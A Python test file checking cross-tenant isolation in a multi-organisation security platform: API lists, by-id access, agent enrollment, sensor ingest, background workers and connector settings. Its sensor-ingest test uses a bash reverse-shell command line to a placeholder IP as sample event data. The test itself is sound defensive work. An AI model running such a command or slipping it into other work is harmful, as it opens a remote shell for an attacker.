"""Cross-tenant isolation (docs/MULTI_TENANCY.md): two organisations on one
platform, each with users, devices, sensor data, IT assets, notifications and
settings. Every main user API (list / get / update / delete), the machine APIs
(agent enrollment and credentials, sensor ingest) and the background jobs must
keep each organisation's data to itself. Runs on SQLite and PostgreSQL."""
from __future__ import annotations

from dataclasses import dataclass
from datetime import timedelta

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import func, select

from app import auth, config, db, tenancy
from app.models import (
    Alert,
    Asset,
    AuditLog,
    Device,
    Finding,
    Organization,
    RuntimeEvent,
    ScanRun,
    User,
    Vulnerability,
    utcnow,
)
from app.notifications import crypto, ssrf
from app.notifications.models import NotificationChannel, NotificationDelivery
from app.services import organizations as orgs
from tests.conftest import AUTH, BASE_URL, login
from tests.test_devices import agent_client, enroll, new_token, windows_checkin

DEFAULT_RINGS = {"Pilot", "Broad", "All devices"}
ACME_ADMIN = "admin@acme.test"
ACME_PASSWORD = "acme-admin-password"
MACHINE = "c" * 64


@dataclass
class Tenants:
    default: TestClient  # admin of the default organisation (seeded simulated data)
    acme: TestClient  # admin of organisation "acme"
    acme_id: str


def create_org(slug: str, admin_email: str, password: str, name: str | None = None, role: str = "admin") -> str:
    with db.get_session(unscoped=True) as s:
        org = orgs.create_organization(s, name=name or slug.title(), slug=slug, created_by="test")
        oid = org.id
        s.commit()
    with db.get_session(oid) as s:
        u = User(email=admin_email, name=admin_email.split("@")[0], password_hash=auth.hash_password(password),
                 password_changed_at=utcnow())
        s.add(u)
        s.flush()
        auth.set_membership(s, u, oid, role)
        s.commit()
    return oid


def org_client(app, email: str, password: str) -> TestClient:
    c = TestClient(app, base_url=BASE_URL)
    login(c, email, password)
    return c


@pytest.fixture()
def tenants(client) -> Tenants:
    acme_id = create_org("acme", ACME_ADMIN, ACME_PASSWORD, name="Acme Ltd")
    return Tenants(client, org_client(client.app, ACME_ADMIN, ACME_PASSWORD), acme_id)


def ingest_token(c: TestClient) -> str:
    r = c.post("/api/organization/ingest-tokens", json={"name": "k8s sensors"})
    assert r.status_code == 201, r.text
    assert r.json()["token"].startswith("cni_")
    return r.json()["token"]


def acme_device(t: Tenants, machine: str = MACHINE, hostname: str = "ACME-LAPTOP") -> tuple[TestClient, str]:
    token = new_token(t.acme)
    agent = agent_client(t.acme.app)
    r = enroll(agent, token, machine_id=machine, hostname=hostname)
    assert r.status_code == 200, r.text
    agent.headers["Authorization"] = f"Bearer {r.json()['device_secret']}"
    body = windows_checkin()
    body["device"]["hostname"] = hostname
    assert agent.post("/api/agent/checkin", json=body).status_code == 200
    return agent, r.json()["device_id"]


def ids(resp) -> set[str]:
    assert resp.status_code == 200, resp.text
    data = resp.json()
    if isinstance(data, dict):
        data = data.get("items", data.get("assets", []))
    return {x["id"] for x in data}


# --------------------------------------------------------------------------- the guard itself
def test_session_without_organisation_fails_closed(tenants):
    with db.get_session() as s:
        with pytest.raises(tenancy.TenancyError):
            s.scalars(select(Asset)).all()
        with pytest.raises(tenancy.TenancyError):
            s.scalar(select(func.count()).select_from(Finding))
        s.rollback()
        s.add(ScanRun(connector="x"))
        with pytest.raises(tenancy.TenancyError):
            s.flush()
        s.rollback()
        # Global reference data stays readable.
        assert s.scalar(select(func.count()).select_from(Organization)) == 2


def test_scoped_session_cannot_touch_another_organisation(tenants):
    with db.get_session(tenants.acme_id) as s:
        assert s.scalars(select(Asset)).all() == []
        assert s.scalar(select(func.count()).select_from(Alert)) == 0
        s.add(ScanRun(connector="x", organization_id=tenancy.DEFAULT_ORG_ID))
        with pytest.raises(tenancy.TenancyError):
            s.flush()
        s.rollback()
    with db.get_session("default") as s:
        alert = s.scalars(select(Alert).where(Alert.status != "resolved")).first()
        alert_id, status_before = alert.id, alert.status
    with db.get_session(tenants.acme_id) as s:
        assert s.get(Alert, alert_id) is None  # Session.get is filtered too
        # An object of another organisation smuggled into the session cannot be written.
        with db.get_session("default") as other:
            foreign = other.get(Alert, alert_id)
        foreign = s.merge(foreign, load=False)
        foreign.status = "resolved"
        with pytest.raises(tenancy.TenancyError):
            s.flush()
        s.rollback()
    with db.get_session("default") as s:
        assert s.get(Alert, alert_id).status == status_before  # unchanged by the attempt


def test_unscoped_is_explicit_and_sees_everything(tenants):
    acme_device(tenants)
    with db.get_session(unscoped=True) as s:
        per_org = dict(s.execute(select(Device.organization_id, func.count()).group_by(Device.organization_id)).all())
    assert per_org == {tenants.acme_id: 1}


# --------------------------------------------------------------------------- user APIs: lists
LIST_ENDPOINTS = ["/api/assets", "/api/findings", "/api/alerts", "/api/vulnerabilities", "/api/devices",
                  "/api/scans", "/api/runtime/events", "/api/notifications/channels", "/api/notifications/rules",
                  "/api/notifications/deliveries", "/api/it-assets", "/api/devices/enrollment-tokens",
                  "/api/approvals", "/api/updates/rings", "/api/organization/ingest-tokens", "/api/users",
                  "/api/audit-log", "/api/it-assets/offboardings", "/api/scripts/runs"]


def _items(resp):
    assert resp.status_code == 200, (resp.request.url, resp.text)
    data = resp.json()
    if isinstance(data, dict):
        for k in ("items", "assets", "runs", "approvals"):
            if isinstance(data.get(k), list):
                return data[k]
        return []
    return data


def test_new_organisation_starts_empty(tenants):
    """The default organisation has the simulated environment; acme sees none of it."""
    d, a = tenants.default, tenants.acme
    assert len(_items(d.get("/api/assets"))) > 10 and len(_items(d.get("/api/alerts"))) > 0
    for url in LIST_ENDPOINTS:
        items = _items(a.get(url))
        if url == "/api/users":
            assert [u["email"] for u in items] == [ACME_ADMIN], url
        elif url == "/api/audit-log":
            assert all(e["actor_email"] in (ACME_ADMIN, None) for e in items), items
        elif url == "/api/updates/rings":  # its own default rings, created on first use
            assert {r["name"] for r in items} <= DEFAULT_RINGS, items
            assert not {r["id"] for r in items} & {r["id"] for r in _items(d.get(url))}
        else:
            assert items == [], url
    dash = a.get("/api/dashboard").json()
    assert dash["assets"]["total"] == 0 and dash["open_findings"] == 0 and dash["top_risks"] == []
    assert dash["vulnerabilities"]["total"] == 0 and dash["alerts"]["open"] == 0
    assert d.get("/api/dashboard").json()["assets"]["total"] > 10
    assert a.get("/api/attack-paths").json() == []
    graph = a.get("/api/attack-paths/graph").json()
    assert graph["nodes"] == [] and graph["edges"] == []
    assert _items(a.get("/api/exposure")) == []
    assert a.get("/api/organization").json()["slug"] == "acme"
    assert d.get("/api/organization").json()["slug"] == "default"
    me = a.get("/api/auth/me").json()
    assert me["organization"]["slug"] == "acme" and me["user"]["role"] == "admin" and not me["platform_admin"]


def test_lists_never_mix_organisations(tenants):
    d, a = tenants.default, tenants.acme
    agent, dev = acme_device(tenants)
    a.post("/api/it-assets", json={"asset_tag": "WK-0001", "asset_type": "laptop"})
    assert d.post("/api/it-assets", json={"asset_tag": "WK-0001", "asset_type": "monitor"}).status_code == 201
    chan = a.post("/api/notifications/channels", json={"name": "Acme Slack", "type": "slack",
                                                      "secrets": {"webhook_url": "https://hooks.slack.com/a/b/c"}})
    assert chan.status_code == 201, chan.text
    for url in LIST_ENDPOINTS:
        da, aa = {x.get("id") for x in _items(d.get(url))}, {x.get("id") for x in _items(a.get(url))}
        assert not (da - {None}) & (aa - {None}), url
    assert [x["id"] for x in _items(a.get("/api/devices"))] == [dev]
    assert dev not in {x["id"] for x in _items(d.get("/api/devices"))}
    tags = {(x["asset_tag"], x["asset_type"]) for x in _items(a.get("/api/it-assets"))}
    # Same tag in both organisations (unique per organisation); the agent device got its own asset.
    assert ("WK-0001", "laptop") in tags and ("WK-0001", "monitor") not in tags
    assert ("WK-0001", "monitor") in {(x["asset_tag"], x["asset_type"]) for x in _items(d.get("/api/it-assets"))}
    assert [c["name"] for c in _items(a.get("/api/notifications/channels"))] == ["Acme Slack"]
    assert "Acme Slack" not in [c["name"] for c in _items(d.get("/api/notifications/channels"))]
    assert ACME_ADMIN not in [u["email"] for u in _items(d.get("/api/users"))]
    assert all(e["actor_email"] != ACME_ADMIN for e in _items(d.get("/api/audit-log")))
    summary = a.get("/api/devices/summary").json()
    assert summary.get("total", 1) == 1


# --------------------------------------------------------------------------- user APIs: by id
def test_objects_of_another_organisation_are_not_found(tenants):
    d, a = tenants.default, tenants.acme
    alert = _items(d.get("/api/alerts"))[0]
    finding = _items(d.get("/api/findings"))[0]
    asset = _items(d.get("/api/assets"))[0]
    with db.get_session("default") as s:  # (no background scan thread: tests share one in-memory connection)
        run = ScanRun(connector="simulated", status="succeeded")
        s.add(run)
        s.commit()
        scan = {"id": run.id}
    default_user = _items(d.get("/api/users"))[0]
    chan = d.post("/api/notifications/channels", json={"name": "SOC", "type": "slack",
                                                      "secrets": {"webhook_url": "https://hooks.slack.com/x/y/z"}})
    chan = chan.json()
    rule = d.post("/api/notifications/rules", json={"name": "All", "channel_ids": [chan["id"]]}).json()
    it = d.post("/api/it-assets", json={"asset_tag": "WK-9", "asset_type": "laptop"}).json()
    tok = d.post("/api/devices/enrollment-tokens", json={"name": "t", "max_uses": 1, "expires_in_hours": 1}).json()
    ring = _items(d.get("/api/updates/rings"))[0]
    sensor = ingest_token(d)
    sensor_id = _items(d.get("/api/organization/ingest-tokens"))[0]["id"]
    assert sensor
    # A default-organisation device (enrolled through the agent API).
    agent = agent_client(d.app)
    r = enroll(agent, new_token(d), machine_id="d" * 64, hostname="WK-LAPTOP")
    dev = r.json()["device_id"]

    not_found = [
        a.get(f"/api/alerts/{alert['id']}"),
        a.patch(f"/api/alerts/{alert['id']}", json={"status": "resolved"}),
        a.patch(f"/api/findings/{finding['id']}", json={"status": "suppressed"}),
        a.get("/api/assets/detail", params={"id": asset["id"]}),
        a.get(f"/api/scans/{scan['id']}"),
        a.patch(f"/api/users/{default_user['id']}", json={"role": "viewer"}),
        a.post(f"/api/users/{default_user['id']}/reset-password", json={"password": "a-new-long-password"}),
        a.post(f"/api/users/{default_user['id']}/reset-mfa"),
        a.get(f"/api/notifications/channels/{chan['id']}"),
        a.patch(f"/api/notifications/channels/{chan['id']}", json={"name": "pwned"}),
        a.post(f"/api/notifications/channels/{chan['id']}/test"),
        a.delete(f"/api/notifications/channels/{chan['id']}"),
        a.put(f"/api/notifications/rules/{rule['id']}", json={"name": "pwned", "channel_ids": []}),
        a.delete(f"/api/notifications/rules/{rule['id']}"),
        a.get(f"/api/it-assets/{it['id']}"),
        a.patch(f"/api/it-assets/{it['id']}", json={"notes": "pwned"}),
        a.delete(f"/api/it-assets/{it['id']}"),
        a.get(f"/api/it-assets/{it['id']}/events"),
        a.post(f"/api/devices/enrollment-tokens/{tok['id']}/revoke"),
        a.patch(f"/api/updates/rings/{ring['id']}", json={"paused": True, "reason": "pwned ring"}),
        a.delete(f"/api/updates/rings/{ring['id']}"),
        a.delete(f"/api/organization/ingest-tokens/{sensor_id}"),
        a.get(f"/api/devices/{dev}"),
        a.get(f"/api/devices/{dev}/software"),
        a.get(f"/api/devices/{dev}/history"),
        a.get(f"/api/devices/{dev}/vulnerabilities"),
        a.get(f"/api/devices/{dev}/commands"),
        a.post(f"/api/devices/{dev}/commands", json={"type": "recheck_posture", "reason": "pwn the device"}),
        a.post(f"/api/devices/{dev}/revoke"),
        a.delete(f"/api/devices/{dev}"),
        a.get(f"/api/updates/devices/{dev}"),
        a.get(f"/api/it-assets/by-device/{dev}"),
    ]
    for resp in not_found:
        assert resp.status_code in (404, 422), (resp.request.method, resp.request.url, resp.status_code, resp.text)
        assert resp.status_code == 404 or "pwn" not in resp.text
    # Nothing changed in the default organisation.
    assert d.get(f"/api/alerts/{alert['id']}").json()["status"] == alert["status"]
    assert d.get(f"/api/notifications/channels/{chan['id']}").json()["name"] == "SOC"
    assert d.get(f"/api/devices/{dev}").json()["status"] == "active"
    assert d.get(f"/api/it-assets/{it['id']}").status_code == 200
    roles = {u["email"]: u["role"] for u in _items(d.get("/api/users"))}
    assert roles[default_user["email"]] == default_user["role"]
    assert not any(r["paused"] for r in _items(d.get("/api/updates/rings")))


# --------------------------------------------------------------------------- machine APIs
def test_enrollment_and_device_credentials_are_bound_to_the_organisation(tenants):
    d = tenants.default
    # Same machine enrolled in both organisations: two separate devices, nothing re-enrolled.
    agent_d = agent_client(d.app)
    rd = enroll(agent_d, new_token(d), machine_id=MACHINE, hostname="SHARED")
    assert rd.status_code == 200 and rd.json()["reenrolled"] is False
    agent_d.headers["Authorization"] = f"Bearer {rd.json()['device_secret']}"
    agent_a, dev_a = acme_device(tenants, machine=MACHINE, hostname="SHARED")
    assert dev_a != rd.json()["device_id"]
    assert agent_d.post("/api/agent/checkin", json=windows_checkin()).status_code == 200  # credential still valid

    # A command for the default organisation's device is invisible to acme's agent.
    cmd = d.post(f"/api/devices/{rd.json()['device_id']}/commands",
                 json={"type": "recheck_posture", "reason": "posture now"}).json()
    assert agent_a.get("/api/agent/commands").json()["commands"] == []
    assert agent_a.post(f"/api/agent/commands/{cmd['id']}/result",
                        json={"nonce": cmd.get("nonce", "x" * 32), "status": "succeeded", "output": "pwned"}
                        ).status_code in (404, 422)
    assert [c["id"] for c in agent_d.get("/api/agent/commands").json()["commands"]] == [cmd["id"]]
    with db.get_session(unscoped=True) as s:
        devs = {x.id: x.organization_id for x in s.scalars(select(Device))}
    assert devs[dev_a] == tenants.acme_id and devs[rd.json()["device_id"]] == "default"


def test_sensor_ingest_tokens_route_data_to_their_organisation(tenants):
    d, a = tenants.default, tenants.acme
    token = ingest_token(a)
    vm = _items(d.get("/api/assets", params={"type": "vm"}))[0]
    # Same event id and same cloud resource id in both organisations.
    event = {"schema_version": "1.0", "event_id": "11111111-2222-3333-4444-555555555555",
             "timestamp": "2026-10-24T10:00:00Z", "event_type": "process_exec", "sensor_id": "node-1",
             "host": "node-1", "cloud": {"provider": "azure", "resource_id": vm["id"]},
             "process": {"pid": 1, "name": "bash", "cmdline": "bash -i >& /dev/tcp/198.51.100.7/9001 0>&1"}}
    ra = a.post("/api/runtime/events", json=[event], headers={"Authorization": f"Bearer {token}"})
    assert ra.status_code == 202, ra.text
    rd = a.post("/api/runtime/events", json=[event], headers=AUTH)  # legacy INGEST_API_TOKEN -> default
    assert rd.status_code == 202 and rd.json()["duplicates"] == 0
    again = a.post("/api/runtime/events", json=[event], headers={"Authorization": f"Bearer {token}"})
    assert again.json()["duplicates"] == 1
    with db.get_session(unscoped=True) as s:
        rows = s.execute(select(RuntimeEvent.organization_id).where(
            RuntimeEvent.id == "11111111222233334444555555555555")).scalars().all()
        assert sorted(rows) == sorted(["default", tenants.acme_id])
        acme_assets = s.scalars(select(Asset).where(Asset.organization_id == tenants.acme_id)).all()
    # The resource id was resolved inside acme only (an acme placeholder / host asset, never the default's VM).
    assert all(x.organization_id == tenants.acme_id for x in acme_assets)
    assert vm["id"] in {x["id"] for x in _items(d.get("/api/assets"))}
    assert all(x["id"] != vm["id"] or x["name"] != vm["name"] for x in _items(a.get("/api/assets")))
    assert {al["id"] for al in _items(a.get("/api/alerts"))}.isdisjoint({al["id"] for al in _items(d.get("/api/alerts"))})
    assert len(_items(a.get("/api/alerts"))) >= 1
    # Package inventory with acme's token stays in acme.
    inv = {"schema_version": "1.0", "sensor_id": "node-1", "host": "node-1",
           "os": {"id": "debian", "version_id": "12"},
           "packages": [{"name": "openssl", "version": "3.0.11-1~deb12u1", "kind": "deb", "source": "openssl"}]}
    rp = a.post("/api/runtime/packages", json=inv, headers={"Authorization": f"Bearer {token}"})
    assert rp.status_code in (202, 422), rp.text
    # A revoked token is refused.
    tid = _items(a.get("/api/organization/ingest-tokens"))[0]["id"]
    assert a.delete(f"/api/organization/ingest-tokens/{tid}").status_code == 200
    assert a.post("/api/runtime/events", json=[event], headers={"Authorization": f"Bearer {token}"}).status_code == 401


# --------------------------------------------------------------------------- background jobs
class Recorder:
    """Stands in for ssrf.post (no network)."""

    def __init__(self):
        self.urls: list[str] = []

    def __call__(self, url, body, headers, *, kind):
        self.urls.append(url)
        return ssrf.HttpResponse(200, b"ok", {})


def test_notification_worker_keeps_events_in_their_organisation(tenants, monkeypatch):
    from app.notifications.events import Event, emit
    from app.notifications.worker import NotificationWorker

    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", crypto.generate_key())
    rec = Recorder()
    monkeypatch.setattr(ssrf, "post", rec)
    hooks = {"default": "https://hooks.slack.com/services/DEFAULT/A/B", tenants.acme_id: "https://hooks.slack.com/services/ACME/A/B"}
    with db.get_session("default") as s:  # ignore the seeded history
        from app.notifications import dispatcher

        while dispatcher.process_events(s):
            pass
    for oid, url in hooks.items():
        with db.get_session(oid) as s:
            ch = NotificationChannel(name=f"chan-{oid}", type="slack", enabled=True, config={},
                                     secret_ciphertext=crypto.encrypt_secrets({"webhook_url": url}), secret_hints={})
            s.add(ch)
            s.flush()
            from app.notifications.models import NotificationRule

            s.add(NotificationRule(name="all", sources=[], event_types=[], min_severity="low", subscription_ids=[],
                                   asset_ids=[], asset_types=[], tags={}, rule_ids=[], mitre_techniques=[],
                                   channel_ids=[ch.id], throttle_minutes=0, mode="immediate", digest_hour=8,
                                   timezone="UTC", created_at=utcnow() - timedelta(days=1)))
            emit(s, Event(source="scan", event_type="failed", severity="high", title=f"event of {oid}",
                          summary="", group_key=f"g-{oid}"))
            s.commit()
    w = NotificationWorker()
    try:
        assert w.tick() is not None
        w.tick()
    finally:
        w._leader.release()
    with db.get_session(unscoped=True) as s:
        rows = s.execute(select(NotificationDelivery.organization_id, NotificationDelivery.title, NotificationChannel.name)
                         .join(NotificationChannel, NotificationChannel.id == NotificationDelivery.channel_id)).all()
    for org_id, title, chan in rows:
        assert chan == f"chan-{org_id}" and title.endswith(org_id), (org_id, title, chan)
    assert {r[0] for r in rows} >= {"default", tenants.acme_id}
    assert rec.urls.count(hooks[tenants.acme_id]) == 1


def test_scan_scheduler_runs_each_organisation_with_its_own_connectors(tenants):
    from app.connectors.base import CollectionResult, Connector
    from app.services import scan_schedule as sched

    class Fake(Connector):
        provider = "fake"

        def __init__(self, name):
            self.name = name

        def is_configured(self):
            return True

        def collect(self):
            return CollectionResult()

    launched: list[tuple[str, str]] = []

    def registry(db_, org_id):
        assert tenancy.org_id(db_) == org_id
        return {f"fake-{org_id}": Fake(f"fake-{org_id}")}

    def launcher(conn, org_id):
        launched.append((org_id, conn.name))
        with db.get_session(org_id) as s:
            s.add(ScanRun(connector=conn.name, trigger="scheduled", status="succeeded", started_at=utcnow()))
            s.commit()

    s = sched.ScanScheduler(startup_delay_seconds=0, registry_factory=registry, launcher=launcher)
    try:
        res = s.tick()
    finally:
        s._leader.release()
    assert sorted(launched) == sorted([("default", "fake-default"), (tenants.acme_id, f"fake-{tenants.acme_id}")])
    assert "fake-default" in res.started
    acme_scans = _items(tenants.acme.get("/api/scans"))
    assert [x["connector"] for x in acme_scans] == [f"fake-{tenants.acme_id}"]
    assert f"fake-{tenants.acme_id}" not in {x["connector"] for x in _items(tenants.default.get("/api/scans"))}


def test_vulnerability_worker_matches_each_organisation_separately(tenants):
    from app.vulnmatch import feeds, worker
    from tests.test_vuln_matching import SOFTWARE, checkin_body
    from tests.vuln_fakes import FakeFeeds

    f = FakeFeeds()
    feeds.set_transport(f.transport(), f.sleep)
    try:
        agent, dev = acme_device(tenants)
        assert agent.post("/api/agent/checkin", json=checkin_body(SOFTWARE, hostname="ACME-LAPTOP")).status_code == 200
        res = worker.run_once(force=True)
        assert f"device:{dev}" in res.matched
    finally:
        feeds.set_transport(None)
    with db.get_session(unscoped=True) as s:
        rows = s.execute(select(Vulnerability.organization_id).where(Vulnerability.device_id == dev)).scalars().all()
    assert rows and set(rows) == {tenants.acme_id}
    acme_v = _items(tenants.acme.get("/api/vulnerabilities"))
    assert acme_v and all(v.get("device_id") in (dev, None) for v in acme_v)
    assert dev not in {v.get("device_id") for v in _items(tenants.default.get("/api/vulnerabilities"))}


def test_agent_update_automation_is_per_organisation(tenants):
    from app.services import agent_update_auto as auto
    from app.services.agent_update_auto import AgentUpdateWorker

    with db.get_session(tenants.acme_id) as s:
        st = auto.get_settings(s)
        st.mode = "automatic"
        s.commit()
    w = AgentUpdateWorker()
    try:
        assert w.tick()
    finally:
        w._leader.release()
    with db.get_session("default") as s:
        assert auto.get_settings(s).mode == "manual"  # AGENT_UPDATE_DEFAULT_MODE in tests
    acme_rings = {r["name"] for r in _items(tenants.acme.get("/api/updates/rings"))}
    assert acme_rings == DEFAULT_RINGS
    # Platform-wide parts (release import, GitHub auto-import) are not for organisation admins.
    assert tenants.acme.post("/api/updates/releases", content=b"x",
                             headers={"Content-Type": "application/gzip"}).status_code == 403
    assert tenants.acme.put("/api/updates/automation", json={"auto_import_enabled": True,
                                                             "reason": "try to change it"}).status_code == 403
    assert tenants.acme.post("/api/updates/automation/check-github").status_code == 403
    assert tenants.acme.post("/api/scripts/bundles", content=b"x",
                             headers={"Content-Type": "application/gzip"}).status_code == 403
    assert tenants.acme.get("/api/updates/automation").json()["auto_import"]["managed_here"] is False


# --------------------------------------------------------------------------- organisation status
def test_suspended_organisation_is_locked_out(tenants):
    a = tenants.acme
    agent, _dev = acme_device(tenants)
    token = ingest_token(a)
    with db.get_session(unscoped=True) as s:
        orgs.set_status(s, s.get(Organization, tenants.acme_id), "suspended", "unpaid")
        s.commit()
    assert a.get("/api/assets").status_code == 401  # existing session ends
    r = TestClient(a.app, base_url=BASE_URL).post("/api/auth/login", json={"email": ACME_ADMIN,
                                                                           "password": ACME_PASSWORD})
    assert r.status_code == 403 and "suspended" in r.text
    assert agent.post("/api/agent/checkin", json=windows_checkin()).status_code == 403
    assert a.post("/api/runtime/events", json=[], headers={"Authorization": f"Bearer {token}"}).status_code == 403
    with db.get_session(unscoped=True) as s:
        assert tenancy.active_org_ids(s) == ["default"]
        with pytest.raises(orgs.OrgError):
            orgs.set_status(s, s.get(Organization, "default"), "suspended")
        orgs.set_status(s, s.get(Organization, tenants.acme_id), "active")
        s.commit()
    assert org_client(a.app, ACME_ADMIN, ACME_PASSWORD).get("/api/assets").status_code == 200


# --------------------------------------------------------------------------- users & audit
def test_users_belong_to_one_organisation(tenants):
    d, a = tenants.default, tenants.acme
    # Email addresses are unique on the platform.
    r = a.post("/api/users", json={"email": "admin@example.com", "name": "x", "role": "viewer",
                                  "password": "a-long-test-password"})
    assert r.status_code == 409
    r = a.post("/api/users", json={"email": "analyst@acme.test", "name": "Ann", "role": "analyst",
                                  "password": "a-long-test-password"})
    assert r.status_code == 201 and r.json()["role"] == "analyst"
    assert {u["email"] for u in _items(a.get("/api/users"))} == {ACME_ADMIN, "analyst@acme.test"}
    assert "analyst@acme.test" not in {u["email"] for u in _items(d.get("/api/users"))}
    # The last admin of acme cannot be demoted, whatever the default organisation has.
    acme_admin = next(u for u in _items(a.get("/api/users")) if u["email"] == ACME_ADMIN)
    assert a.patch(f"/api/users/{acme_admin['id']}", json={"role": "viewer"}).status_code == 409
    ann = org_client(a.app, "analyst@acme.test", "a-long-test-password")
    assert ann.get("/api/auth/me").json()["organization"]["id"] == tenants.acme_id
    with db.get_session(unscoped=True) as s:
        acme_actions = {r.action for r in s.scalars(select(AuditLog).where(AuditLog.organization_id == tenants.acme_id))}
        default_actions = [r.target for r in s.scalars(select(AuditLog).where(AuditLog.organization_id == "default"))]
    assert {"login_success", "user_created"} <= acme_actions
    assert "analyst@acme.test" not in default_actions


def test_cli_platform_admin_and_org_list(tenants, monkeypatch, capsys):
    from app import cli

    monkeypatch.setattr(db, "init_engine", lambda url, **kw: None)
    assert cli.main(["platform-admin", ACME_ADMIN]) == 0
    me = org_client(tenants.acme.app, ACME_ADMIN, ACME_PASSWORD).get("/api/auth/me").json()
    assert me["platform_admin"] is True
    assert cli.main(["platform-admin", ACME_ADMIN, "--revoke"]) == 0
    assert cli.main(["org-list"]) == 0
    out = capsys.readouterr().out
    assert "acme" in out and "[default]" in out
    monkeypatch.setenv("PLATFORM_ADMIN_EMAILS", ACME_ADMIN)
    config.reload_settings()
    try:
        me = org_client(tenants.acme.app, ACME_ADMIN, ACME_PASSWORD).get("/api/auth/me").json()
        assert me["platform_admin"] is True
    finally:
        monkeypatch.delenv("PLATFORM_ADMIN_EMAILS")
        config.reload_settings()


# --------------------------------------------------------------------------- cloud connector settings
def test_connector_settings_are_per_organisation(tenants, monkeypatch):
    from app.connectors import build_registry
    from app.connectors.org_config import org_settings

    monkeypatch.setenv("NOTIFICATIONS_ENCRYPTION_KEY", crypto.generate_key())
    monkeypatch.setenv("AZURE_SUBSCRIPTION_IDS", "11111111-1111-1111-1111-111111111111")
    monkeypatch.setenv("AZURE_MANAGED_IDENTITY_CLIENT_ID", "mi-client")
    monkeypatch.setenv("AWS_USE_DEFAULT_CREDENTIALS", "true")
    config.reload_settings()
    try:
        with db.get_session("default") as s:
            reg = build_registry(org_settings(s))
            assert reg["azure"].is_configured() and reg["aws"].is_configured() and reg["simulated"].is_configured()
        with db.get_session(tenants.acme_id) as s:
            reg = build_registry(org_settings(s))
            # The server's own identity and environment credentials are never lent to another organisation.
            assert not any(reg[n].is_configured() for n in ("azure", "aws", "gcp", "simulated"))
        conns = {c["provider"]: c for c in tenants.default.get("/api/organization/connectors").json()}
        assert conns["azure"]["from_environment"] is True
        acme = {c["provider"]: c for c in tenants.acme.get("/api/organization/connectors").json()}
        assert not any(c["stored"] or c["from_environment"] for c in acme.values())
        r = tenants.acme.put("/api/organization/connectors/azure", json={
            "config": {"tenant_id": "22222222-2222-2222-2222-222222222222", "client_id": "app-id",
                       "subscription_ids": ["33333333-3333-3333-3333-333333333333"]},
            "secrets": {"client_secret": "super-secret-value-123"}})
        assert r.status_code == 200, r.text
        assert "super-secret-value-123" not in r.text and r.json()["secrets"]["client_secret"].startswith("supe")
        with db.get_session(tenants.acme_id) as s:
            st = org_settings(s)
            assert st.azure_subscription_ids == ["33333333-3333-3333-3333-333333333333"]
            assert st.azure_client_secret == "super-secret-value-123" and st.azure_auth_mode == "client_secret"
            assert st.azure_managed_identity_client_id is None and not st.aws_use_default_credentials
            assert build_registry(st)["azure"].is_configured()
        with db.get_session("default") as s:
            assert org_settings(s).azure_subscription_ids == ["11111111-1111-1111-1111-111111111111"]
        assert {c["name"]: c["configured"] for c in tenants.acme.get("/api/connectors").json()}["azure"] is True
        assert tenants.acme.post("/api/scans", json={"connector": "simulated"}).status_code == 400
        bad = tenants.acme.put("/api/organization/connectors/aws", json={"config": {"role_arns": ["nope"]}})
        assert bad.status_code == 422
        with db.get_session(unscoped=True) as s:
            from app.models import ConnectorConfig

            row = s.scalar(select(ConnectorConfig).where(ConnectorConfig.organization_id == tenants.acme_id))
            assert "super-secret" not in (row.secret_ciphertext or "")
    finally:
        for k in ("AZURE_SUBSCRIPTION_IDS", "AZURE_MANAGED_IDENTITY_CLIENT_ID", "AWS_USE_DEFAULT_CREDENTIALS"):
            monkeypatch.delenv(k)
        config.reload_settings()


def test_findings_and_assets_keep_composite_keys(tenants):
    """The same cloud resource id may exist in two organisations (composite keys)."""
    with db.get_session("default") as s:
        a = s.scalars(select(Asset)).first()
        rid, rname = a.id, a.name
    with db.get_session(tenants.acme_id) as s:
        s.add(Asset(id=rid, name="acme copy", type="vm"))
        s.flush()
        s.add(Finding(rule_id="AZ-TEST", asset_id=rid, title="t", severity="low"))
        s.commit()
        f = s.scalars(select(Finding)).one()
        assert f.asset.name == "acme copy"
    with db.get_session("default") as s:
        from app.models import get_asset

        assert get_asset(s, rid).name == rname
        assert s.scalar(select(func.count()).select_from(Finding).where(Finding.rule_id == "AZ-TEST")) == 0
    # Deleting acme's copy cascades to acme's finding only.
    with db.get_session(tenants.acme_id) as s:
        s.delete(s.scalars(select(Asset)).one())
        s.commit()
        assert s.scalar(select(func.count()).select_from(Finding)) == 0
    with db.get_session("default") as s:
        from app.models import get_asset

        assert get_asset(s, rid) is not None
